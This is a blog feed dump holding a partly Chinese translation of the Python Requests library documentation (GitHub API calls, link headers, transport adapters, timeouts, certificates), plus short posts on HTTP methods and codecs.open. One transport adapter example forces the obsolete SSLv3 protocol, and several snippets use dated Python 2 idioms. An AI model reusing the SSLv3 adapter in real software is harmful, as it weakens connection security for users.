<p>额，这有点古怪哈。可能我们需要验证身份。那就有点纠结了，对吧？不对。Requests简化了多种身份验证形式的使用， 包括非常常见的Basic Auth。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> requests.auth <span class="keyword">import</span> HTTPBasicAuth</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>auth = HTTPBasicAuth(<span class="string">'fake@example.com'</span>, <span class="string">'not_a_real_password'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.post(url=url, data=body, auth=auth)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.status_code</div><div class="line"><span class="number">201</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>content = r.json()</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>print(content[<span class="string">u'body'</span>])</div><div class="line">Sounds great! I<span class="string">'ll get right on it.</span></div></pre></td></tr></table></figure>
<p>精彩！噢，不！我原本是想说等我一会，因为我得去喂一下我的猫。如果我能够编辑这条评论那就好了！ 幸运的是，GitHub允许我们使用另一个HTTP动词，PATCH，来编辑评论。我们来试试。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>print(content[<span class="string">u"id"</span>])</div><div class="line"><span class="number">5804413</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>body = json.dumps(&#123;<span class="string">u"body"</span>: <span class="string">u"Sounds great! I'll get right on it once I feed my cat."</span>&#125;)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">u"https://api.github.com/repos/kennethreitz/requests/issues/comments/5804413"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.patch(url=url, data=body, auth=auth)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.status_code</div><div class="line"><span class="number">200</span></div></pre></td></tr></table></figure>
<p>非常好。现在，我们来折磨一下这个叫肯尼思的家伙，我决定要让他急得团团转，也不告诉他是我在捣蛋。 这意味着我想删除这条评论。GitHub允许我们使用完全名副其实的DELETE方法来删除评论。我们来清除该评论。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.delete(url=url, auth=auth)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.status_code</div><div class="line"><span class="number">204</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.headers[<span class="string">'status'</span>]</div><div class="line"><span class="string">'204 No Content'</span></div></pre></td></tr></table></figure>
<p>很好。不见了。最后一件我想知道的事情是我已经使用了多少限额（ratelimit）。查查看，GitHub在响应头部发送这个信息， 因此不必下载整个网页，我将使用一个HEAD请求来获取响应头。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.head(url=url, auth=auth)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> r.headers</div><div class="line">...</div><div class="line"><span class="string">'x-ratelimit-remaining'</span>: <span class="string">'4995'</span></div><div class="line"><span class="string">'x-ratelimit-limit'</span>: <span class="string">'5000'</span></div><div class="line">...</div></pre></td></tr></table></figure>
<p>很好。是时候写个Python程序以各种刺激的方式滥用GitHub的API，还可以使用4995次呢。</p>
<hr>
<h2 id="响应头链接字段"><a href="#响应头链接字段" class="headerlink" title="响应头链接字段"></a>响应头链接字段</h2><hr>
<p>许多HTTP API都有响应头链接字段的特性，它们使得API能够更好地自我描述和自我显露。</p>
<p>GitHub在API中为 <a href="http://developer.github.com/v3/#pagination" target="_blank" rel="external">分页</a> 使用这些特性，例如:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'https://api.github.com/users/kennethreitz/repos?page=1&amp;per_page=10'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.head(url=url)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.headers[<span class="string">'link'</span>]</div><div class="line"><span class="string">'&lt;https://api.github.com/users/kennethreitz/repos?page=2&amp;per_page=10&gt;; rel="next", &lt;https://api.github.com/users/kennethreitz/repos?page=6&amp;per_page=10&gt;; rel="last"'</span></div></pre></td></tr></table></figure>
<p>Requests会自动解析这些响应头链接字段，并使得它们非常易于使用:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.links[<span class="string">"next"</span>]</div><div class="line">&#123;<span class="string">'url'</span>: <span class="string">'https://api.github.com/users/kennethreitz/repos?page=2&amp;per_page=10'</span>, <span class="string">'rel'</span>: <span class="string">'next'</span>&#125;</div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.links[<span class="string">"last"</span>]</div><div class="line">&#123;<span class="string">'url'</span>: <span class="string">'https://api.github.com/users/kennethreitz/repos?page=7&amp;per_page=10'</span>, <span class="string">'rel'</span>: <span class="string">'last'</span>&#125;</div></pre></td></tr></table></figure>
<hr>
<h2 id="Transport-Adapters"><a href="#Transport-Adapters" class="headerlink" title="Transport Adapters"></a>Transport Adapters</h2><hr>
<p>As of v1.0.0, Requests has moved to a modular internal design. Part of the reason this was done was to implement Transport Adapters, originally <a href="http://www.kennethreitz.org/essays/the-future-of-python-http" target="_blank" rel="external">described here</a>. Transport Adapters provide a mechanism to define interaction methods for an HTTP service. In particular, they allow you to apply per-service configuration.</p>
<p>Requests ships with a single Transport Adapter, the HTTPAdapter. This adapter provides the default Requests interaction with HTTP and HTTPS using the powerful <a href="https://github.com/shazow/urllib3" target="_blank" rel="external">urllib3</a> library. Whenever a Requests <a href="http://cn.python-requests.org/zh_CN/latest/api.html#requests.Session" target="_blank" rel="external">Session</a> is initialized, one of these is attached to the <a href="http://cn.python-requests.org/zh_CN/latest/api.html#requests.Session" target="_blank" rel="external">Session</a> object for HTTP, and one for HTTPS.</p>
<p>Requests enables users to create and use their own Transport Adapters that provide specific functionality. Once created, a Transport Adapter can be mounted to a Session object, along with an indication of which web services it should apply to.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>s = requests.Session()</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s.mount(<span class="string">'http://www.github.com'</span>, MyAdapter())</div></pre></td></tr></table></figure>
<p>The mount call registers a specific instance of a Transport Adapter to a prefix. Once mounted, any HTTP request made using that session whose URL starts with the given prefix will use the given Transport Adapter.</p>
<p>Many of the details of implementing a Transport Adapter are beyond the scope of this documentation, but take a look at the next example for a simple SSL use- case. For more than that, you might look at subclassing <em>requests.adapters.BaseAdapter</em>.</p>
<h3 id="Example-Specific-SSL-Version"><a href="#Example-Specific-SSL-Version" class="headerlink" title="Example: Specific SSL Version"></a>Example: Specific SSL Version</h3><p>The Requests team has made a specific choice to use whatever SSL version is default in the underlying library (<a href="https://github.com/shazow/urllib3" target="_blank" rel="external">urllib3</a>). Normally this is fine, but from time to time, you might find yourself needing to connect to a service-endpoint that uses a version that isn’t compatible with the default.</p>
<p>You can use Transport Adapters for this by taking most of the existing implementation of HTTPAdapter, and adding a parameter <em>ssl_version</em> that gets passed-through to <em>urllib3</em>. We’ll make a TA that instructs the library to use SSLv3:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> ssl</div><div class="line"></div><div class="line"><span class="keyword">from</span> requests.adapters <span class="keyword">import</span> HTTPAdapter</div><div class="line"><span class="keyword">from</span> requests.packages.urllib3.poolmanager <span class="keyword">import</span> PoolManager</div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ssl3HttpAdapter</span><span class="params">(HTTPAdapter)</span>:</span></div><div class="line">    <span class="string">""""Transport adapter" that allows us to use SSLv3."""</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">init_poolmanager</span><span class="params">(self, connections, maxsize, block=False)</span>:</span></div><div class="line">        self.poolmanager = PoolManager(num_pools=connections,</div><div class="line">                                       maxsize=maxsize,</div><div class="line">                                       block=block,</div><div class="line">                                       ssl_version=ssl.PROTOCOL_SSLv3)</div></pre></td></tr></table></figure>
<hr>
<h2 id="Blocking-Or-Non-Blocking"><a href="#Blocking-Or-Non-Blocking" class="headerlink" title="Blocking Or Non-Blocking?"></a>Blocking Or Non-Blocking?</h2><hr>
<p>With the default Transport Adapter in place, Requests does not provide any kind of non-blocking IO. The <a href="http://cn.python-requests.org/zh_CN/latest/api.html#requests.Response.content" target="_blank" rel="external"><strong>Response.content</strong></a> property will block until the entire response has been downloaded. If you require more granularity, the streaming features of the library (see <a href="http://cn.python-requests.org/zh_CN/latest/user/advanced.html#streaming-requests" target="_blank" rel="external">流式请求</a>) allow you to retrieve smaller quantities of the response at a time. However, these calls will still block.</p>
<p>If you are concerned about the use of blocking IO, there are lots of projects out there that combine Requests with one of Python’s asynchronicity frameworks. Two excellent examples are <a href="https://github.com/kennethreitz/grequests" target="_blank" rel="external">grequests</a> and <a href="https://github.com/ross/requests-futures" target="_blank" rel="external">requests-futures</a>.</p>
<hr>
<h2 id="Timeouts"><a href="#Timeouts" class="headerlink" title="Timeouts"></a>Timeouts</h2><hr>
<p>Most requests to external servers should have a timeout attached, in case the server is not responding in a timely manner. Without a timeout, your code may hang for minutes or more.</p>
<p>The connect timeout is the number of seconds Requests will wait for your client to establish a connection to a remote machine (corresponding to the <a href="http://linux.die.net/man/2/connect" target="_blank" rel="external">connect()</a>) call on the socket. It’s a good practice to set connect timeouts to slightly larger than a multiple of 3, which is the default <a href="http://www.hjp.at/doc/rfc/rfc2988.txt" target="_blank" rel="external">TCP packet retransmission window</a>.</p>
<p>Once your client has connected to the server and sent the HTTP request, the read timeout is the number of seconds the client will wait for the server to send a response. (Specifically, it’s the number of seconds that the client will wait between bytes sent from the server. In 99.9% of cases, this is the time before the server sends the first byte).</p>
<p>If you specify a single value for the timeout, like this:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">r = requests.get(<span class="string">'https://github.com'</span>, timeout=<span class="number">5</span>)</div></pre></td></tr></table></figure>
<p>The timeout value will be applied to both the connect and the read timeouts. Specify a tuple if you would like to set the values separately:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">r = requests.get(<span class="string">'https://github.com'</span>, timeout=(<span class="number">3.05</span>, <span class="number">27</span>))</div></pre></td></tr></table></figure>
<p>If the remote server is very slow, you can tell Requests to wait forever for a response, by passing None as a timeout value and then retrieving a cup of coffee.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">r = requests.get(<span class="string">'https://github.com'</span>, timeout=<span class="keyword">None</span>)</div></pre></td></tr></table></figure>
<hr>
<h2 id="CA-Certificates"><a href="#CA-Certificates" class="headerlink" title="CA Certificates"></a>CA Certificates</h2><hr>
<p>By default Requests bundles a set of root CAs that it trusts, sourced from the <a href="https://hg.mozilla.org/mozilla-central/raw-file/tip/security/nss/lib/ckfw/builtins/certdata.txt" target="_blank" rel="external">Mozilla trust store</a>. However, these are only updated once for each Requests version. This means that if you pin a Requests version your certificates can become extremely out of date.</p>
<p>From Requests version 2.4.0 onwards, Requests will attempt to use certificates from <a href="http://certifi.io/" target="_blank" rel="external">certifi</a> if it is present on the system. This allows for users to update their trusted certificates without having to change the code that runs on their system.</p>
<p>For the sake of security we recommend upgrading certifi frequently!</p>
<hr>
<blockquote>
<p><strong>说明：前面有些官方文档没翻译到的，我自己翻译了，后一部分，时间太晚了，是在没精力了，以后有时间再翻译，可能我翻译的有些语句不通顺，但是还是能大概表达出意思的，如果你对比了官方文档，觉得你可以翻译得更好，可以私信或留言我哦</strong></p>
<p><strong>想喷我的人也省省吧，的确，这篇文章和之前的一篇Requests安装使用都是我从官网移植过来的，但是我花时间翻译了一部分，排版也废了番功夫，使用MarkDown写成，需要源md文档也可以找我索要，本文随意传播</strong></p>
<hr>
<p><strong>我是Akkuman，同道人可以和我一起交流哦，私信或留言均可,我的博客hacktech.cn | 53xiaoshuo.com</strong></p>
<hr>
</blockquote>
]]></content>
      
        <categories>
            
            <category> Python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[HTTP协议请求类型介绍]]></title>
      <url>http://akkuman.coding.me/2016/06/10/HTTP%E5%8D%8F%E8%AE%AE%E8%AF%B7%E6%B1%82%E7%B1%BB%E5%9E%8B%E4%BB%8B%E7%BB%8D.html</url>
      <content type="html"><![CDATA[<hr>
<p><strong>HTTP协议中共定义了八种方法或者叫“动作”来表明对Request-URI指定的资源的不同操作方式，具体介绍如下：</strong></p>
<hr>
<h1 id="OPTIONS："><a href="#OPTIONS：" class="headerlink" title="OPTIONS："></a>OPTIONS：</h1><p>返回服务器针对特定资源所支持的HTTP请求方法。也可以利用向Web服务器发送’*’的请求来测试服务器的功能性。</p>
<h1 id="HEAD："><a href="#HEAD：" class="headerlink" title="HEAD："></a>HEAD：</h1><p>向服务器索要与GET请求相一致的响应，只不过响应体将不会被返回。这一方法可以在不必传输整个响应内容的情况下，就可以获取包含在响应消息头中的元信息。</p>
<h1 id="GET："><a href="#GET：" class="headerlink" title="GET："></a>GET：</h1><p>向特定的资源发出请求。<br><a id="more"></a></p>
<h1 id="POST："><a href="#POST：" class="headerlink" title="POST："></a>POST：</h1><p>向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的创建和/或已有资源的修改。 </p>
<h1 id="PUT："><a href="#PUT：" class="headerlink" title="PUT："></a>PUT：</h1><p>向指定资源位置上传其最新内容。 </p>
<h1 id="DELETE："><a href="#DELETE：" class="headerlink" title="DELETE："></a>DELETE：</h1><p>请求服务器删除Request-URI所标识的资源。 </p>
<h1 id="TRACE："><a href="#TRACE：" class="headerlink" title="TRACE："></a>TRACE：</h1><p>回显服务器收到的请求，主要用于测试或诊断。 </p>
<h1 id="CONNECT："><a href="#CONNECT：" class="headerlink" title="CONNECT："></a>CONNECT：</h1><p>HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。</p>
<hr>
<p><strong>虽然HTTP的请求方式有8种，但是我们在实际应用中常用的也就是get和post，其他请求方式也都可以通过这两种方式间接的来实现。</strong></p>
<hr>
<p>转载自：<a href="http://www.xuebuyuan.com/1586750.html" target="_blank" rel="external">http://www.xuebuyuan.com/1586750.html</a></p>
]]></content>
      
        <categories>
            
            <category> Web </category>
            
        </categories>
        
        
        <tags>
            
            <tag> HTTP </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Python中的open和codecs.open]]></title>
      <url>http://akkuman.coding.me/2016/06/10/Python%E4%B8%AD%E7%9A%84open%E5%92%8Ccodecs-open.html</url>
      <content type="html"><![CDATA[<p>最近老被编码困扰，多次折腾之后，感觉python的编解码做得挺好的，只要了解<strong>下边的流程，一般都能解决</strong></p>
<p><strong>input文件(gbk, utf-8…)   —-decode—–&gt;   unicode  ——-encode——&gt; output文件(gbk, utf-8…)</strong><br>很多文本挖掘的package是在unicode上边做事的，比如nltk. 所以开始读入文件后要decode为unicode格式，可以通过下边两步：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">f=open(<span class="string">'XXXXX'</span>, <span class="string">'r'</span>)</div><div class="line">content=f.read().decode(<span class="string">'utf-8'</span>)</div></pre></td></tr></table></figure></p>
<p>更好的方法是使用codecs.open读入时直接解码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">f=codecs.open(XXX, encoding=<span class="string">'utf-8'</span>)</div><div class="line">content=f.read()</div></pre></td></tr></table></figure></p>
<p>转自: <a href="http://f.dataguru.cn/thread-237116-1-1.html" target="_blank" rel="external">http://f.dataguru.cn/thread-237116-1-1.html</a></p>
]]></content>
      
        <categories>
            
            <category> Python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Python之Requests的安装与基本使用]]></title>
      <url>http://akkuman.coding.me/2016/06/09/Python%E4%B9%8BRequests%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8.html</url>
      <content type="html"><![CDATA[<hr>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><hr>
<p>使用 pip 安装Requests非常简单<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install requests</div></pre></td></tr></table></figure></p>
<p>或者使用 easy_install 安装<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">easy_install requests</div></pre></td></tr></table></figure></p>
<hr>
<h1 id="获得源码"><a href="#获得源码" class="headerlink" title="获得源码"></a>获得源码</h1><hr>
<p>Requests 一直在Github上被积极的开发着</p>
<p>你可以克隆公共版本库:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git <span class="built_in">clone</span> git://github.com/kennethreitz/requests.git</div></pre></td></tr></table></figure>
<a id="more"></a>
<p>下载 源码:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl -OL https://github.com/kennethreitz/requests/tarball/master</div></pre></td></tr></table></figure>
<p>或者下载 zipball:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl -OL https://github.com/kennethreitz/requests/zipball/master</div></pre></td></tr></table></figure>
<p>一旦你获得了复本，你就可以轻松的将它嵌入到你的python包里或者安装到你的site-packages:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python setup.py install</div></pre></td></tr></table></figure>
<hr>
<h1 id="快速上手"><a href="#快速上手" class="headerlink" title="快速上手"></a>快速上手</h1><hr>
<hr>
<h2 id="发送请求"><a href="#发送请求" class="headerlink" title="发送请求"></a>发送请求</h2><hr>
<p>使用Requests发送网络请求非常简单。</p>
<p>一开始要导入Requests模块:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> requests</div></pre></td></tr></table></figure>
<p>然后，尝试获取某个网页。本例子中，我们来获取Github的公共时间线</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">'https://github.com/timeline.json'</span>)</div></pre></td></tr></table></figure>
<p>现在，我们有一个名为 r 的 Response 对象。可以从这个对象中获取所有我们想要的信息。</p>
<p>Requests简便的API意味着所有HTTP请求类型都是显而易见的。例如，你可以这样发送一个HTTP POST请求:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.post(<span class="string">"http://httpbin.org/post"</span>)</div></pre></td></tr></table></figure>
<p>漂亮，对吧？那么其他HTTP请求类型：PUT， DELETE， HEAD以及OPTIONS又是如何的呢？都是一样的简单:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.put(<span class="string">"http://httpbin.org/put"</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.delete(<span class="string">"http://httpbin.org/delete"</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.head(<span class="string">"http://httpbin.org/get"</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.options(<span class="string">"http://httpbin.org/get"</span>)</div></pre></td></tr></table></figure>
<p>都很不错吧，但这也仅是Requests的冰山一角呢。</p>
<hr>
<h2 id="为URL传递参数"><a href="#为URL传递参数" class="headerlink" title="为URL传递参数"></a>为URL传递参数</h2><hr>
<p>你也许经常想为URL的查询字符串(query string)传递某种数据。如果你是手工构建URL，那么数据会以键/值 对的形式置于URL中，跟在一个问号的后面。例如， httpbin.org/get?key=val 。 Requests允许你使用 params 关键字参数，以一个字典来提供这些参数。举例来说，如果你想传递 key1=value1 和 key2=value2 到 httpbin.org/get ，那么你可以使用如下代码:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>payload = &#123;<span class="string">'key1'</span>: <span class="string">'value1'</span>, <span class="string">'key2'</span>: <span class="string">'value2'</span>&#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">"http://httpbin.org/get"</span>, params=payload)</div></pre></td></tr></table></figure>
<p>通过打印输出该URL，你能看到URL已被正确编码:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; print(r.url)</div><div class="line">http://httpbin.org/get?key2=value2&amp;key1=value1</div></pre></td></tr></table></figure>
<p>注意字典里值为 None 的键都不会被添加到 URL 的查询字符串里。</p>
<hr>
<h2 id="响应内容"><a href="#响应内容" class="headerlink" title="响应内容"></a>响应内容</h2><hr>
<p>我们能读取服务器响应的内容。再次以Github时间线为例:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> requests</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">'https://github.com/timeline.json'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.text</div><div class="line"><span class="string">u'[&#123;"repository":&#123;"open_issues":0,"url":"https://github.com/...</span></div></pre></td></tr></table></figure>
<p>Requests会自动解码来自服务器的内容。大多数unicode字符集都能被无缝地解码。</p>
<p>请求发出后，Requests会基于HTTP头部对响应的编码作出有根据的推测。当你访问 r.text 之时，Requests会使用其推测的文本编码。你可以找出Requests使用了什么编码，并且能够使用 r.encoding 属性来改变它:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.encoding</div><div class="line"><span class="string">'utf-8'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.encoding = <span class="string">'ISO-8859-1'</span></div></pre></td></tr></table></figure>
<p>如果你改变了编码，每当你访问 r.text ，Request都将会使用 r.encoding 的新值。你可能希望在使用特殊逻辑计算出文本的编码的情况下来修改编码。比如 HTTP 和 XML 自身可以指定编码。这样的话，你应该使用 r.content 来找到编码，然后设置 r.encoding 为相应的编码。这样就能使用正确的编码解析 r.text 了。</p>
<p>在你需要的情况下，Requests也可以使用定制的编码。如果你创建了自己的编码，并使用 codecs 模块进行注册，你就可以轻松地使用这个解码器名称作为 r.encoding 的值， 然后由Requests来为你处理编码。</p>
<hr>
<h2 id="二进制响应内容"><a href="#二进制响应内容" class="headerlink" title="二进制响应内容"></a>二进制响应内容</h2><hr>
<p>你也能以字节的方式访问请求响应体，对于非文本请求:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.content</div><div class="line"><span class="string">b'[&#123;"repository":&#123;"open_issues":0,"url":"https://github.com/...</span></div></pre></td></tr></table></figure>
<p>Requests会自动为你解码 <strong>gzip</strong> 和 <strong>deflate</strong> 传输编码的响应数据。</p>
<p>例如，以请求返回的二进制数据创建一张图片，你可以使用如下代码:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> StringIO <span class="keyword">import</span> StringIO</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>i = Image.open(StringIO(r.content))</div></pre></td></tr></table></figure>
<hr>
<h2 id="JSON响应内容"><a href="#JSON响应内容" class="headerlink" title="JSON响应内容"></a>JSON响应内容</h2><hr>
<p>Requests中也有一个内置的JSON解码器，助你处理JSON数据:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> requests</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">'https://github.com/timeline.json'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.json()</div><div class="line">[&#123;<span class="string">u'repository'</span>: &#123;<span class="string">u'open_issues'</span>: <span class="number">0</span>, <span class="string">u'url'</span>: <span class="string">'https://github.com/...</span></div></pre></td></tr></table></figure>
<p>如果JSON解码失败， r.json 就会抛出一个异常。例如，相应内容是 401 (Unauthorized) ，尝试访问 r.json 将会抛出 ValueError: No JSON object could be decoded 异常。</p>
<hr>
<h2 id="原始响应内容"><a href="#原始响应内容" class="headerlink" title="原始响应内容"></a>原始响应内容</h2><hr>
<p>在罕见的情况下你可能想获取来自服务器的原始套接字响应，那么你可以访问 r.raw 。 如果你确实想这么干，那请你确保在初始请求中设置了 <strong>stream=True</strong> 。具体的你可以这么做:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">'https://github.com/timeline.json'</span>, stream=<span class="keyword">True</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.raw</div><div class="line">&lt;requests.packages.urllib3.response.HTTPResponse object at <span class="number">0x101194810</span>&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.raw.read(<span class="number">10</span>)</div><div class="line"><span class="string">'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x03'</span></div></pre></td></tr></table></figure>
<p>但一般情况下，你应该以下面的模式将文本流保存到文件:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">with</span> open(filename, <span class="string">'wb'</span>) <span class="keyword">as</span> fd:</div><div class="line">    <span class="keyword">for</span> chunk <span class="keyword">in</span> r.iter_content(chunk_size):</div><div class="line">        fd.write(chunk)</div></pre></td></tr></table></figure>
<p>使用 Response.iter_content 将会处理大量你直接使用 Response.raw 不得不处理的。 当流下载时，上面是<strong>优先推荐</strong>的获取内容方式。</p>
<hr>
<h2 id="定制请求头"><a href="#定制请求头" class="headerlink" title="定制请求头"></a>定制请求头</h2><hr>
<p>如果你想为请求添加HTTP头部，只要简单地传递一个 dict 给 headers 参数就可以了。</p>
<p>例如，在前一个示例中我们没有指定content-type:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> json</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'https://api.github.com/some/endpoint'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>payload = &#123;<span class="string">'some'</span>: <span class="string">'data'</span>&#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>headers = &#123;<span class="string">'content-type'</span>: <span class="string">'application/json'</span>&#125;</div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.post(url, data=json.dumps(payload), headers=headers)</div></pre></td></tr></table></figure>
<hr>
